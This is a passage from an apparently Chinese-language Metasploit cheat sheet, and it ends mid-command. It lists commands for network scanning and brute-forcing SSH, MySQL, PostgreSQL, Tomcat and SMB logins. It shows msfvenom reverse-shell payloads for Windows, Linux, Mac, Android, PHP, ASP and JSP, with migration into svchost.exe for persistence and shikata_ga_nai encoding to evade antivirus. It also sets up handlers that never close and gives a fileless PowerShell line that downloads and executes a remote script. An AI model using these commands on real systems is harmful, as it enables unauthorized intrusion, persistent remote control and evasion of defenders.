auxiliary/scanner/telnet/telnet_version</span><br><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">setTHREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="FTP-主机扫描："><a href="#FTP-主机扫描：" class="headerlink" title="FTP 主机扫描："></a>FTP 主机扫描：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/ftp/ftp_version</span><br><span class="line">Show options</span><br><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">setTHREADS 255</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="扫描-FTP-匿名登录："><a href="#扫描-FTP-匿名登录：" class="headerlink" title="扫描 FTP 匿名登录："></a>扫描 FTP 匿名登录：</h2></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">useauxiliary/scanner/ftp/anonymos</span><br><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">setTHREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="扫描局域网内有哪些主机存活"><a href="#扫描局域网内有哪些主机存活" class="headerlink" title="扫描局域网内有哪些主机存活"></a>扫描局域网内有哪些主机存活</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">setTHREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="扫描网站目录"><a href="#扫描网站目录" class="headerlink" title="扫描网站目录"></a>扫描网站目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 192.168.1.1</span><br><span class="line">setTHREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="搜索网站中的E-mail地址"><a href="#搜索网站中的E-mail地址" class="headerlink" title="搜索网站中的E-mail地址"></a>搜索网站中的E-mail地址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search_email_collector</span><br><span class="line">use auxiliary/gather/search_email_collector</span><br><span class="line">set DOMAIN cracer.com</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="嗅探抓包"><a href="#嗅探抓包" class="headerlink" title="嗅探抓包"></a>嗅探抓包</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/sniffer/psnuffle</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h1 id="MSF-密码破解模块"><a href="#MSF-密码破解模块" class="headerlink" title="MSF  密码破解模块"></a>MSF  密码破解模块</h1><h2 id="ssh服务口令猜测"><a href="#ssh服务口令猜测" class="headerlink" title="ssh服务口令猜测"></a>ssh服务口令猜测</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">set RHOSTS 192.168.80.134</span><br><span class="line">set USERNAME root</span><br><span class="line">set PASS_FILE /root/pass.txt</span><br><span class="line">set THREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="mysql口令攻击"><a href="#mysql口令攻击" class="headerlink" title="mysql口令攻击"></a>mysql口令攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 192.168.80.130</span><br><span class="line">set user_file /root/user.txt</span><br><span class="line">set pass_file /root/pass.txt</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="postgresql攻击"><a href="#postgresql攻击" class="headerlink" title="postgresql攻击"></a>postgresql攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search  postgresql</span><br><span class="line">use auxiliary/scanner/postgres/postgres_login</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 192.168.80.130</span><br><span class="line">set user_file /root/user.txt</span><br><span class="line">set pass_fiel /root/pass.txt</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="tomcat-攻击"><a href="#tomcat-攻击" class="headerlink" title="tomcat 攻击"></a>tomcat 攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search tomcat</span><br><span class="line">use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class="line">set RHOSTS 192.168.1.1</span><br><span class="line">set PASS_FILE /root/pass.txt</span><br><span class="line">set USER_FILE /root/user.txt</span><br><span class="line">exploit</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="telnet-攻击"><a href="#telnet-攻击" class="headerlink" title="telnet 攻击"></a>telnet 攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/telnet/telnet_login</span><br><span class="line">set 192.168.1.1</span><br><span class="line">exploit</span><br><span class="line">use auxiliary/scanner/telnet/telnet_login</span><br><span class="line">set 192.168.1.1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="samba攻击"><a href="#samba攻击" class="headerlink" title="samba攻击"></a>samba攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set RHOSTS 192.168.1.1 /192.168.1.0/24</span><br><span class="line">set THREADS 200</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h1 id="MSF-漏洞利用模块"><a href="#MSF-漏洞利用模块" class="headerlink" title="MSF 漏洞利用模块"></a>MSF 漏洞利用模块</h1><h2 id="Metasploit-常用漏洞利用命令"><a href="#Metasploit-常用漏洞利用命令" class="headerlink" title="Metasploit 常用漏洞利用命令"></a>Metasploit 常用漏洞利用命令</h2><ul><li><p>用指定关键字搜索可利用漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search &lt;name&gt;</span><br></pre></td></tr></table></figure></li><li><p>使用漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use &lt;exploit name&gt;</span><br></pre></td></tr></table></figure></li><li><p>显示选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options </span><br></pre></td></tr></table></figure></li><li><p>设置选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set &lt;OPTION NAME&gt; &lt;option&gt;</span><br></pre></td></tr></table></figure></li><li><p>显示装置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show payloads </span><br></pre></td></tr></table></figure></li><li><p>显示目标(os版本)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show targets </span><br></pre></td></tr></table></figure></li><li><p>设置目标版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set TARGET &lt;target number&gt; </span><br></pre></td></tr></table></figure></li><li><p>开始漏洞攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit </span><br></pre></td></tr></table></figure></li><li><p>列出会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -l</span><br></pre></td></tr></table></figure></li><li><p>选择会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i &lt;ID&gt; </span><br></pre></td></tr></table></figure></li><li><p>结束会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -k &lt;ID&gt; </span><br></pre></td></tr></table></figure></li><li><p>把会话放到后台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ctrl&gt; z </span><br></pre></td></tr></table></figure></li><li><p>结束会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ctrl&gt; c </span><br></pre></td></tr></table></figure></li><li><p>显示辅助模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show auxiliary </span><br></pre></td></tr></table></figure></li><li><p>使用辅助模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use &lt;auxiliary name&gt; </span><br></pre></td></tr></table></figure></li><li><p>设置选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set &lt;OPTION NAME&gt; &lt;option&gt; </span><br></pre></td></tr></table></figure></li><li><p>运行模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run </span><br></pre></td></tr></table></figure><h1 id="MSF-PAYLOAD模块"><a href="#MSF-PAYLOAD模块" class="headerlink" title="MSF PAYLOAD模块"></a>MSF PAYLOAD模块</h1></li><li><p>msfvenom是msfpayload和msfencode的结合体，于2015年6月8日取代了msfpayload和msfencode。在此之后，metasploit-framework下面的的msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）都不再被支持。</p></li></ul><h1 id="msfvenom所有参数"><a href="#msfvenom所有参数" class="headerlink" title="msfvenom所有参数"></a>msfvenom所有参数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Options:</span><br><span class="line">    -l, --list            &lt;type&gt;     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all</span><br><span class="line">    -p, --payload         &lt;payload&gt;  Payload to use (--list payloads to list, --list-options for arguments). Specify &#x27;-&#x27; or STDIN for custom</span><br><span class="line">        --list-options               List --payload &lt;value&gt;&#x27;s standard, advanced and evasion options</span><br><span class="line">    -f, --format          &lt;format&gt;   Output format (use --list formats to list)</span><br><span class="line">    -e, --encoder         &lt;encoder&gt;  The encoder to use (use --list encoders to list)</span><br><span class="line">        --service-name    &lt;value&gt;    The service name to use when generating a service binary</span><br><span class="line">        --sec-name        &lt;value&gt;    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string</span><br><span class="line">        --smallest                   Generate the smallest possible payload using all available encoders</span><br><span class="line">        --encrypt         &lt;value&gt;    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)</span><br><span class="line">        --encrypt-key     &lt;value&gt;    A key to be used for --encrypt</span><br><span class="line">        --encrypt-iv      &lt;value&gt;    An initialization vector for --encrypt</span><br><span class="line">    -a, --arch            &lt;arch&gt;     The architecture to use for --payload and --encoders (use --list archs to list)</span><br><span class="line">        --platform        &lt;platform&gt; The platform for --payload (use --list platforms to list)</span><br><span class="line">    -o, --out             &lt;path&gt;     Save the payload to a file</span><br><span class="line">    -b, --bad-chars       &lt;list&gt;     Characters to avoid example: &#x27;\x00\xff&#x27;</span><br><span class="line">    -n, --nopsled         &lt;length&gt;   Prepend a nopsled of [length] size on to the payload</span><br><span class="line">        --pad-nops                   Use nopsled size specified by -n &lt;length&gt; as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)</span><br><span class="line">    -s, --space           &lt;length&gt;   The maximum size of the resulting payload</span><br><span class="line">        --encoder-space   &lt;length&gt;   The maximum size of the encoded payload (defaults to the -s value)</span><br><span class="line">    -i, --iterations      &lt;count&gt;    The number of times to encode the payload</span><br><span class="line">    -c, --add-code        &lt;path&gt;     Specify an additional win32 shellcode file to include</span><br><span class="line">    -x, --template        &lt;path&gt;     Specify a custom executable file to use as a template</span><br><span class="line">    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread</span><br><span class="line">    -v, --var-name        &lt;value&gt;    Specify a custom variable name to use for certain output formats</span><br><span class="line">    -t, --timeout         &lt;second&gt;   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)</span><br><span class="line">    -h, --help                       Show this message</span><br></pre></td></tr></table></figure><h2 id="msfvenom参数总结"><a href="#msfvenom参数总结" class="headerlink" title="msfvenom参数总结"></a>msfvenom参数总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-l &lt;type&gt;：列出相关类型（如payloads, encoders, nops, platforms, archs, encrypt, formats, all）的所有模块信息。</span><br><span class="line">-p &lt;payload&gt;：设置使用的payload。</span><br><span class="line">-p &lt;payload&gt; --list-options：列出指定的payload的相关参数。</span><br><span class="line">-f &lt;format&gt;：设置输出格式。</span><br><span class="line">--encoder &lt;encoder&gt;：设置所使用的编码器。</span><br><span class="line">--service-name &lt;value&gt;：设置生成的二进制服务程序的名称。</span><br><span class="line">--sec-name &lt;value&gt;：设置当生成大的windows二进制程序文件时使用的节(section)名。默认是四个随机字母组成的字符串。</span><br><span class="line">--smallest：使用所有的编码器生成尽可能小的payload。</span><br><span class="line">--encrypt &lt;value&gt;：设置编码或加密shellcode的方式。</span><br><span class="line">--encrypt-key &lt;value&gt;：设置加密密钥。</span><br><span class="line">--encrypt-iv &lt;value&gt;：设置加密的初始向量IV。</span><br><span class="line">-a &lt;arch&gt;：设置payload使用的软件架构。</span><br><span class="line">--platform &lt;platform&gt;：设置payload使用的平台。</span><br><span class="line">-o &lt;path&gt;：将payload保存到指定的文件路径。</span><br><span class="line">-b &lt;list&gt;：设置payload中需要避免的字符。</span><br><span class="line">-n &lt;length&gt;：在payload中预置指定长度的滑板指令。</span><br><span class="line">-n &lt;length&gt; --pad-nops：指定payload的文件大小，自动在payload中添加一定数量的滑板指令。</span><br><span class="line">-s, --space &lt;length&gt;：设置生成的payload的最大文件大小。</span><br><span class="line">--encoder-space &lt;length&gt;：设置编码后的payload的最大文件大小。</span><br><span class="line">-i &lt;count&gt;：指定编码的次数。</span><br><span class="line">-c &lt;path&gt; ：指定包含额外的win32 shellcode的文件路径。</span><br><span class="line">-x &lt;path&gt;：使用一个可执行文件当作模板。</span><br><span class="line">-k：保留模板文件的功能，将payload作为线程注入。</span><br><span class="line">-v &lt;value&gt;：为某些特定的输出格式指定变量名。</span><br><span class="line">-t &lt;second&gt;：设置从STDIN读取payload的最长等待时间（单位为秒）。默认为30秒。设置为0表示禁用时间限制。</span><br><span class="line">-h：输出帮助页面</span><br></pre></td></tr></table></figure><h1 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h1><ul><li><p>比如想查看windows&#x2F;meterpreter&#x2F;reverse_tcp支持什么平台、哪些选项，可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --list-options</span><br></pre></td></tr></table></figure></li><li><p>可查看所有payloads</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list payloads</span><br></pre></td></tr></table></figure></li><li><p>可查看所有编码器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list encoders</span><br></pre></td></tr></table></figure></li><li><p>评级最高的两个encoder为 <code>cmd/powershell_base64</code> 和 <code>x86/shikata_ga_nai</code> ，其中 <code>x86/shikata_ga_nai</code> 也是免杀中使用频率最高的一个编码器</p></li><li><p>类似可用msfvenom –list命令查看的还有payloads, encoders, nops, platforms, archs, encrypt, formats</p><h1 id="监听参数"><a href="#监听参数" class="headerlink" title="监听参数"></a>监听参数</h1></li></ul><h2 id="防止假session"><a href="#防止假session" class="headerlink" title="防止假session"></a>防止假session</h2><ul><li><p>在实战中，经常会遇到假session或者刚连接就断开的情况，这里补充一些监听参数，防止假死与假session。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; set ExitOnSession false   </span><br></pre></td></tr></table></figure></li><li><p>可以在接收到seesion后继续监听端口，保持侦听,防止session意外退出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; set SessionCommunicationTimeout 0    </span><br></pre></td></tr></table></figure></li><li><p>默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; set SessionExpirationTimeout 0</span><br></pre></td></tr></table></figure></li><li><p>默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit -j -z</span><br></pre></td></tr></table></figure></li><li><p>使用exploit -j -z可在后台持续监听,-j为后台任务，-z为持续监听，使用Jobs命令查看和管理后台任务。jobs -K可结束所有任务。</p></li><li><p>还有种比较快捷的建立监听的方式，在msf下直接执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -H 192.168.8.124 -P 1122 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h1 id="payload的可持续化"><a href="#payload的可持续化" class="headerlink" title="payload的可持续化"></a>payload的可持续化</h1></li><li><p>一般来说使用msfvenom生成的payload会单独开启一个进程，这种进程很容易被发现和关闭，在后期想做持久化的时候只能再使用migrate进行。</p></li><li><p>其实在生成payload时可直接使用如下命令，生成的payload会直接注入到指定进程中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -e x86/shikata_ga_nai -b &quot;\x00&quot; -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o  shell.exe</span><br></pre></td></tr></table></figure></li><li><p>生成的shell程序执行后会启动两个进程shell.exe和svchost.exe，关闭其中一个不会影响会话状态。<br>在上面的生成payload参数中：</p><ol><li>PrependMigrate&#x3D;true PrependMigrateProc&#x3D;svchost.exe 使这个程序默认会迁移到svchost.exe进程，自己测试的时候不建议到这个进程而是其他的持久进程。</li><li>使用-p指定使用的攻击载荷模块，使用-e指定使用x86&#x2F;shikata_ga_nai编码器，使用-f选项告诉MSF编码器输出格式为exe，-o选项指定输出的文件名为payload.exe，保存在根目录下。<h1 id="各平台payload生成"><a href="#各平台payload生成" class="headerlink" title="各平台payload生成"></a>各平台payload生成</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -a x86 --platform Linux -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><h2 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -f raw &gt; shell.apk</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 R &gt; test.apk</span><br></pre></td></tr></table></figure><h1 id="生成脚本payload"><a href="#生成脚本payload" class="headerlink" title="生成脚本payload"></a>生成脚本payload</h1><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.8.124 LPORT=1122 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1</span><br></pre></td></tr></table></figure><h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><h3 id="nc正向连接"><a href="#nc正向连接" class="headerlink" title="nc正向连接"></a>nc正向连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_hidden_bind_tcp LHOST=192.168.8.124 LPORT=1122  -f exe&gt; 1.exe</span><br></pre></td></tr></table></figure><h3 id="nc反向连接，监听"><a href="#nc反向连接，监听" class="headerlink" title="nc反向连接，监听"></a>nc反向连接，监听</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.8.124 LPORT=1122  -f exe&gt; 1.exe</span><br></pre></td></tr></table></figure><h1 id="生成脚本payload-1"><a href="#生成脚本payload-1" class="headerlink" title="生成脚本payload"></a>生成脚本payload</h1></li></ol></li></ul><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><h3 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure><h1 id="侦听Handlers"><a href="#侦听Handlers" class="headerlink" title="侦听Handlers"></a>侦听Handlers</h1><ul><li>use exploit&#x2F;multi&#x2F;handler</li><li>set PAYLOAD <Payload name></li><li>set LHOST 192.168.8.124</li><li>set LPORT 1122</li><li>set ExitOnSession false</li><li>exploit -j -z<h1 id="Powershell-配合msf无文件攻击"><a href="#Powershell-配合msf无文件攻击" class="headerlink" title="Powershell 配合msf无文件攻击"></a>Powershell 配合msf无文件攻击</h1><h2 id="生成ps脚本"><a href="#生成ps脚本" class="headerlink" title="生成ps脚本"></a>生成ps脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1121 -f psh-reflection &gt;x.ps1</span><br></pre></td></tr></table></figure><h2 id="设置侦听"><a href="#设置侦听" class="headerlink" title="设置侦听"></a>设置侦听</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">Set lhost 192.168.3.107 </span><br><span class="line">Run</span><br></pre></td></tr></table></figure></li></ul><h2 id="客户端运行"><a href="#客户端运行" class="headerlink" title="客户端运行"></a>客户端运行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.8.1/x.ps1&#x27;)</span><br></pre></td></tr></table></figure><h1 id="Evasion模块免杀"><a href="#Evasion模块免杀" class="headerlink" title="Evasion模块免杀"></a>Evasion模块免杀</h1><ul><li>2019年1月，metasploit升级到了5.0，引入了一个新的模块叫Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马。</li><li>evasion有以下几个模块,可以使用<code>show evasion</code>进行查看。</li></ul><p>使用<code>use windows/windows_defender_exe</code>进行生成payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use windows/windows_defender_exe</span><br><span class="line">msf5 